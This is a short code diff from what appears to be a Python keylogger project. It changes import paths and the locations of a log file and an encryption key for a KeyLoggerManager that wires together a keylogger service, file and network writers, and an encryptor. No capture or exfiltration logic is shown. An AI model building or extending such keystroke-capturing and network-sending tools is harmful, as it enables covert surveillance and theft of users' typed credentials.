@@ -1,13 +1,13 @@
-from encryptionDecryption.encryption import Encryption
-from keylogger.keylogger_service import KeyloggerService
-from writer.FileWriter import FileWriter
-from writer.NetWorkWriter import NetWorkWriter
+from utilities.encryptionDecryption.encryption import Encryption
+from logger.keylogger.keylogger_service import KeyloggerService
+from logger.writer.FileWriter import FileWriter
+from logger.writer.NetWorkWriter import NetWorkWriter
 from time import sleep
 from datetime import datetime
 import uuid
 import logging
 
-logging.basicConfig(filename='log.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s', filemode='a')
+logging.basicConfig(filename='../../utilities/log.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s', filemode='a')
 
 class KeyLoggerManager:
     def __init__(self):
@@ -15,7 +15,7 @@ class KeyLoggerManager:
         self.file_writer = FileWriter()
         self.netWork_writer = NetWorkWriter()
         self.keylogger = KeyloggerService()
-        self.encoder = Encryption(open('key.txt', 'r').read())
+        self.encoder = Encryption(open('../../utilities/key.txt', 'r').read())
         self.flag = True
 
     def start(self):
